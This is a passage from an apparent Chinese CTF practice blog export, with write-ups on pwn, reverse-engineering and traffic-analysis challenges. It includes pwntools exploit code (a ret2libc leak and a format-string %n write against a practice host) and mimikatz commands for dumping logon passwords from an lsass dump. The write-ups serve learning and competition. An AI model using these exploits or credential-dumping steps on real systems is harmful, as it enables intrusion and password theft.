class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = offest + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#bin_sh_addr = offest + libc.search(&#x27;bin/sh&#x27;).next()</span></span><br><span class="line">bin_sh_addr = offest + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="Buu-jarvisoj-fm-fm-n任意内存写入"><a href="#Buu-jarvisoj-fm-fm-n任意内存写入" class="headerlink" title="Buu - jarvisoj_fm[ fm %n任意内存写入]"></a>Buu - jarvisoj_fm[ fm %n任意内存写入]</h2><p>checksec一下 32位，用IDA打开</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/4-7-00.png"></p>
-<p><strong>思路：</strong></p>
-<p>要想shell，肯定要满足x&#x3D;&#x3D;4；</p>
-<p>然后又看到有<code>printf(buf)</code> 格式化字符串漏洞标志</p>
-<p>&#x3D;&gt; 通过%n向x地址写入4</p>
-<p><strong>1.确定偏移量</strong></p>
-<p>这是32位程序，第一个参数可以写入AAAA &#x3D; ( 正好占满一个栈的小格子(4字节)的空间 )</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/4-7-01.png"></p>
-<p>-&gt; %08，让长度为8，比较容易好看吧，这个无所谓</p>
-<p>-&gt; %x(打印十六进制数据) 或者 %p(打印栈上数据)均可</p>
-<p>&#x3D;&#x3D;&gt; 偏移量为11</p>
-<p><strong>2.通过<code>%(偏移量)$n</code>来写入值</strong></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># if语句中可以调用system(&#x27;bin/sh&#x27;) =&gt; 满足if语句</span></span><br><span class="line"><span class="comment"># 让x=4</span></span><br><span class="line"><span class="comment"># x - addr：0804A02C</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25301</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./fm&#x27;)</span></span><br><span class="line">x_addr = <span class="number">0x0804A02C</span></span><br><span class="line">payload = p32(x_addr) + <span class="string">&quot;%11$n&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Re刷题记录</title>
-    <url>/CTF/Re/Re%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h2 id="Buu-新年快乐-初用upx"><a href="#Buu-新年快乐-初用upx" class="headerlink" title="Buu - 新年快乐 [ 初用upx ]"></a>Buu - 新年快乐 [ 初用upx ]</h2><p>32位有壳</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-4-00.png"></p>
-<blockquote>
-<p>加壳 upx.exe filename</p>
-<p>脱壳 upx.exe -d filename</p>
-</blockquote>
-<p><strong>在upx目录下打开终端，将软件放在相同目录（或者直接给出绝对路径）</strong></p>
-<p>脱完壳之后用32位ida打开，进入main函数，</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-4-01.png"></p>
-<p>str2就是flag</p>
-<h2 id="Buu-xor-ida运用"><a href="#Buu-xor-ida运用" class="headerlink" title="Buu - xor [ ida运用 ]"></a>Buu - xor [ ida运用 ]</h2><p>查壳，无壳，拖进64位ida（我是在linux中file命令看的位）</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-00.png"></p>
-<blockquote>
-<p>这是main函数，先看到</p>
-<p> if ( !strncmp(__b, global, 33uLL) )<br>    printf(“Success”);</p>
-<p>要success &#x3D;&gt; __b &#x3D;&#x3D; global 前33位相等</p>
-</blockquote>
-<blockquote>
-<p>全部分析一遍，先给__b 256字节置0 -&gt; 调用get_line函数 -&gt; 输入__b -&gt; __b字符串的长度只能是33 -&gt; 然后是for循环，一个异或</p>
-<p>-&gt; 最后比较，前33位要相等</p>
-</blockquote>
-<p><strong>Result</strong>： global[i] &#x3D; b[i] ^ b[i-1]，我们要求的是__b的值（前面的printf语句，input your flag），可以看出长度为33（如果不是33，直接goto LABEL_7 &#x3D;&gt; return语句）</p>
-<p><strong>Skill</strong>：点击global查看它的值，跳转到上面这个图中，看到灰色的部分（我奇怪的是，与Wp中看到的值不一样，我就随便双击了一下灰色部分，发现依然可以跳转），然后就来到了下面这个图的部分</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-01.png"></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shift + e =&gt; 提取数组中的字符</span><br></pre></td></tr></table></figure></div>
-
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-02.png" alt="4-5-02"></p>
-<p>脚本异或一下得到__b的值</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">data = [</span><br><span class="line">  <span class="number">102</span>,  <span class="number">10</span>, <span class="number">107</span>,  <span class="number">12</span>, <span class="number">119</span>,  <span class="number">38</span>,  <span class="number">79</span>,  <span class="number">46</span>,  <span class="number">64</span>,  <span class="number">17</span>,</span><br><span class="line">  <span class="number">120</span>,  <span class="number">13</span>,  <span class="number">90</span>,  <span class="number">59</span>,  <span class="number">85</span>,  <span class="number">17</span>, <span class="number">112</span>,  <span class="number">25</span>,  <span class="number">70</span>,  <span class="number">31</span>,</span><br><span class="line">  <span class="number">118</span>,  <span class="number">34</span>,  <span class="number">77</span>,  <span class="number">35</span>,  <span class="number">68</span>,  <span class="number">14</span>, <span class="number">103</span>,   <span class="number">6</span>, <span class="number">104</span>,  <span class="number">15</span>,</span><br><span class="line">   <span class="number">71</span>,  <span class="number">50</span>,  <span class="number">79</span>,  <span class="number">0</span></span><br><span class="line">]</span><br><span class="line">x = <span class="string">&quot;f&quot;</span>  <span class="comment"># for循环是从1开始的</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(data)):</span><br><span class="line">    x += <span class="built_in">chr</span>(data[i]^data[i-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="Buu-reverse3-base64加密函数"><a href="#Buu-reverse3-base64加密函数" class="headerlink" title="Buu - reverse3 [ base64加密函数 ]"></a>Buu - reverse3 [ base64加密函数 ]</h2><p>32位无壳，拖进ida32位中，找到main_0函数</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-03.png"></p>
-<p>输入字符串 Str -&gt; 经过sub_4110BE函数之后赋值给v4 -&gt; 将v4前40位字符给Destination -&gt; 遍历Destination字符串 每一个加上下表-&gt; 比较Destination 和 Str2是否相同</p>
-<blockquote>
-<p>sub_4110BE函数</p>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-04.png"></p>
-<p>-&gt; 下面这是一个base64加密的过程（Wp）</p>
-<p><strong>Result：</strong>可以查看Str2字符串值（追踪Str2），推出来输入的值（先base64加密 后每一位加上下标）</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-05.png"></p>
-<p><strong>payload：</strong></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = <span class="string">&quot;e3nifIH9b_C@n@dH&quot;</span></span><br><span class="line">str1 = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    str1 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(data[i]) - i)</span><br><span class="line">flag = base64.b64decode(str1)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="Buu-不一样的flag-迷宫题"><a href="#Buu-不一样的flag-迷宫题" class="headerlink" title="Buu - 不一样的flag [ 迷宫题 ]"></a>Buu - 不一样的flag [ 迷宫题 ]</h2><p>32位无壳，用ida打开，看到一串数字和上下左右（猜测是迷宫题）</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-00.png"></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-01.png"></p>
-<p>选中 <code>&#39;49&#39;</code>换成字符 -&gt; R键将Ascii换成对应字符</p>
-<p>-&gt; 如果是1 就退出</p>
-<p>-&gt; 如果是# 你输入的序列就是flag</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">*1111</span><br><span class="line">01000</span><br><span class="line">01010</span><br><span class="line">00010</span><br><span class="line">1111#</span><br><span class="line">下下下右右上上右右下下下</span><br><span class="line">222441144222</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>5*5列，从*开始，1,2,3,4对应上下左右 走到#</p>
-</blockquote>
-<h2 id="Buu-SimpleRev-字节序-真是逆向了"><a href="#Buu-SimpleRev-字节序-真是逆向了" class="headerlink" title="Buu - SimpleRev [ 字节序 真是逆向了 ]"></a>Buu - SimpleRev [ 字节序 真是逆向了 ]</h2><p>字节的排列方式有两个通用规则： <a class="link" href="https://www.ruanyifeng.com/blog/2022/06/endianness-analysis.html">学习了解字节序00 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>                    <a class="link" href="https://www.ruanyifeng.com/blog/2016/11/byte-order.html">学习了解字节序01 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><strong>大端序</strong> - 数据的低位字节放在内存的高位地址，高位字节存放在低位地址</p>
-<p><strong>小端序</strong> - 低位放在低地址，高位放在高地址</p>
-<p><strong>CPU读取内存中的数据时，是从低地址向高地址方向进行读取的</strong></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-02.png"></p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i ) <span class="comment">// v5是key的长度</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( key[v3 % v5] &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; key[v3 % v5] &lt;= <span class="string">&#x27;Z&#x27;</span> ) <span class="comment">// 判断key中的每个元素是不是大写字母</span></span><br><span class="line">    key[i] = key[v3 % v5] + <span class="number">32</span>;	<span class="comment">// 如果是，将那一位 加上32 =&gt; 变成对应的小写字母</span></span><br><span class="line">  ++v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">96</span> || v1 &gt; <span class="number">122</span> )	<span class="comment">// 小写字母范围</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">64</span> &amp;&amp; v1 &lt;= <span class="number">90</span> ) <span class="comment">// 大写字母范围</span></span><br><span class="line">    &#123;</span><br><span class="line">      str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>; <span class="comment">// 下面这些就有点懵逼了了</span></span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">  ++v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>还要对Ascii码熟悉点</p>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-03.png"></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">text = <span class="string">&quot;killshadow&quot;</span></span><br><span class="line">key = <span class="string">&quot;adsfkndcls&quot;</span></span><br><span class="line">dic = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>((<span class="built_in">ord</span>(j) - <span class="number">39</span> - <span class="built_in">ord</span>(key[i]) + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>) == text[i]:</span><br><span class="line">            flag += j</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        s = <span class="number">9180147350284624745LL</span>;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, f1);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, &amp;f2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>case4：将s字符串赋值给f2</p>
-<p>case5：对于f2字符串，如果是奇数位 -2；如果是偶数位 -1</p>
-<p>case1：f1已知，f2是上面得到的，两个拼接 就是s</p>
-</blockquote>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">f1 = <span class="string">&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x7f</span>, <span class="number">0x66</span>, <span class="number">0x6f</span>, <span class="number">0x60</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x69</span>][::-<span class="number">1</span>] <span class="comment">#逆序 [ 字节序 小端序 ]</span></span><br><span class="line"><span class="comment"># 0x7F666F6067756369</span></span><br><span class="line">flag = f1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(key)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(key[i] - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(key[i] - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
-]]></content>
-      <categories>
-        <category>Reverse</category>
-      </categories>
-      <tags>
-        <tag>Reverse</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Misc-流量题记录</title>
-    <url>/CTF/Misc/%E6%B5%81%E9%87%8F/</url>
-    <content><![CDATA[<h2 id="Buu-9-3-1-HTTP流量分析http流量分析"><a href="#Buu-9-3-1-HTTP流量分析http流量分析" class="headerlink" title="Buu - 9.3.1 HTTP流量分析http流量分析"></a>Buu - 9.3.1 HTTP流量分析http流量分析</h2><p>下载<a class="link" href="https://files.buuoj.cn/files/6d44d2b69c7a5941a25b713dde3d903f/atta.pcapng">附件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，用wireshark打开，题目时http流量的分析</p>
-<p>直接过滤搜索http</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-1-00.png"></p>
-<p>显而易见的shell.php  &#x3D;&gt; 后门文件吧？</p>
-<p>在你觉得可疑的流量包上 右键，追踪流 http流</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-1-01.png"></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-1-02.png"></p>
-<h3 id="过滤器知识点："><a href="#过滤器知识点：" class="headerlink" title="过滤器知识点："></a>过滤器知识点：</h3><p><code>http contains &#39;flag&#39;</code></p>
-<p>-&gt; 匹配http协议的 且 流量包中含有flag字符的</p>
-<hr>
-<h2 id="安洵杯-2019-Attack-压缩包"><a href="#安洵杯-2019-Attack-压缩包" class="headerlink" title="[安洵杯 2019]Attack [ 压缩包 ]"></a>[安洵杯 2019]Attack [ 压缩包 ]</h2><p>用wireshark打开，过滤器语句<code> http contains &quot;flag&quot;</code>看看有没有结果：</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-00.png"></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-01.png"></p>
-<p>有结果肯定要追踪http流，（我自己做的时候只关注到了flag.txt）却没关注到 PK（zip压缩包的标志）</p>
-<p><del>我的第一想法肯定要将它给拿出来进行分离zip获得flag.txt的</del></p>
-<p>但看了Wp：直接分离这个流量包（附件）即可：用kali中的工具<code>foremost -T Attack.pcap</code></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-03.png"></p>
-<p>获得zip压缩包，但是有加密，这个压缩包的 属性 -&gt; 注释  中提示信息，指向了管理员的密码</p>
-<p>哪里获取管理员密码呢，看Wp说是 dmp文件</p>
-<blockquote>
-<p>dmp后缀文件是windows系统中的错误转储文件，当windows发生错误蓝屏的时候，系统将当前内存[含虚拟内存]中数据直接写到这类文件中去，方便定位故障原因。 里面包含了主机用户密码信息</p>
-</blockquote>
-<p>经过过滤器，发现是有dmp的信息的 [ 之后感觉我这个过滤语句不太好，dmp只是三个字符而已，有可能出现偶尔情况，加个. ] [我不知道通配符是什么，我试了 <code>*.dmp</code> 没结果]</p>
-<p>发现有，就导出</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-05.png"></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-02.png"></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-04.png"></p>
-<p>接下来需要用到工具 <code>mimikatz</code> 下载链接</p>
-<p><a class="link" href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p>具体用法我也不知道。关于这个题：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//提升权限</span><br><span class="line">privilege::debug</span><br><span class="line">//载入dmp文件</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">//读取登陆密码</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure></div>
-
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-06.png" alt="4-2-06"></p>
-<p>我不知道为什么 我输入提升权限的那句代码会报错，</p>
-<p>但是输入后面的代码正常运行。</p>
-<p>然后就会看到密码了。Password：</p>
-<h2 id="NewStarCTF-公开赛赛道-最后的流量分析-tshark"><a href="#NewStarCTF-公开赛赛道-最后的流量分析-tshark" class="headerlink" title="[NewStarCTF 公开赛赛道]最后的流量分析 [ tshark ]"></a>[NewStarCTF 公开赛赛道]最后的流量分析 [ tshark ]</h2><p><a class="link" href="http://linux.51yip.com/search/tshark">tshark的使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><code>tshark -r sqli.pcap -T fields -Y &quot;http.request.method==GET or frame.len&gt;765&quot; -e &quot;frame.len&quot; -e &quot;http.request.uri.query.parameter&quot; &gt; data.txt</code></p>
-<blockquote>
-<p>-r 解析的流量文件</p>
-<p>-T 指定输出的格式，fields &#x3D;&gt; 只输出符合条件的字段</p>
-<p>-Y 用于过滤流量包 &#x3D;&gt; 上面的-Y表示 只取GET方法的或者流量包长度大于765的</p>
-<p>-e 要输出的字段 &#x3D;&gt; 上面的-e表示 输出流量包长度以及流量包中uri中的参数</p>
-<p>&gt; 重定向，这里表示将输出的东西 重定向到一个data.txt文件内</p>
-</blockquote>
-<p>第一次用这个tshark 看手册吧.</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">comment = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;E:\OneDrive\桌面\CTF\data.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	lines = f.readlines() <span class="comment"># 读取txt文件中的每一行</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lines)):	<span class="comment"># len(lines)-&gt;读取的行数</span></span><br><span class="line">		<span class="comment"># print(lines[i])</span></span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">int</span>(lines[i][:<span class="number">3</span>])&gt;<span class="number">765</span>:</span><br><span class="line">			comment += re.findall(<span class="string">r&#x27;&quot;(.)&quot;&#x27;</span>, unquote(lines[i-<span class="number">1</span>]))[<span class="number">0</span>]	<span class="comment"># 观察得到的txt文本，当出现&gt;768的行数，上一行双引号中的内容就是flag的值 =&gt; 正是因为我们观察到了这个，才通过python来得到这个内容</span></span><br><span class="line"><span class="comment"># unquote -&gt; 解码url编码的字符串</span></span><br><span class="line"><span class="comment"># r&#x27;&#x27; -&gt; 将转义字符当做普通字符</span></span><br><span class="line"><span class="comment"># . 通配符</span></span><br><span class="line"><span class="built_in">print</span>(comment)</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="NSS-鹤城杯-2021-流量分析"><a href="#NSS-鹤城杯-2021-流量分析" class="headerlink" title="NSS - [鹤城杯 2021]流量分析"></a>NSS - [鹤城杯 2021]流量分析</h2><p>打开wireshark，看到是sql注入的信息，这题我熟，刚做过。就去用tshark了，但是看了眼wp，直接在这个导出页面找就行！</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-00.png"></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">123</span>,<span class="number">119</span>,<span class="number">49</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">65</span>,<span class="number">82</span>,<span class="number">75</span>,<span class="number">95</span>,<span class="number">101</span>,<span class="number">122</span>,<span class="number">95</span>,<span class="number">49</span>,<span class="number">115</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">125</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">59</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    result += <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag : &quot;</span> + result)</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="USB流量-键盘流量"><a href="#USB流量-键盘流量" class="headerlink" title="USB流量 - 键盘流量"></a>USB流量 - 键盘流量</h2><p><a class="link" href="https://wuyong.lanzout.com/ihBPQ0uug8id">附件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>            <a class="link" href="https://blog.csdn.net/ON_Zero/article/details/130528679">参考 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p>用tshark获取其中的数据</p>
-<p><code>tshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p>
-<p>-&gt; -r 是要解析的文件名</p>
-<p>-&gt; -T 是选择以什么形式输出  &#x3D;&gt; fields 以字段形式输出，意味着只显示捕获数据中的特定字段，而不是整个数据包</p>
-<p>-&gt; -e usb.capdata 告诉tshark输出与USB相关的数据，</p>
-<p>-&gt; | 这是一个管道符，它将tshark输出传递给 sed命令</p>
-<p>-&gt; sed是流编辑器，用于处理文本流，后面这个 &#x2F;^\s*$&#x2F;d 是正则表达式，删除所有空行</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-3-00.png"></p>
-<p>将获取到的数据没两个之间用:隔开</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 给每一行的数据 俩俩 用冒号隔开</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\\桌面\\CTF\\Misc流量\\键盘\\usbdata.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\\桌面\CTF\\Misc流量\\键盘\\out.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="comment"># 读取每一行 进行去空，</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        a[i] = a[i].strip()</span><br><span class="line">    <span class="comment"># print(a)</span></span><br><span class="line">        <span class="comment"># if a[i]:</span></span><br><span class="line">            <span class="comment"># print(len(a[i]))</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a[i]) == <span class="number">16</span>:</span><br><span class="line">            <span class="comment"># print(f&quot;[*] Success &#123;i&#125;&quot;)</span></span><br><span class="line">            out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> 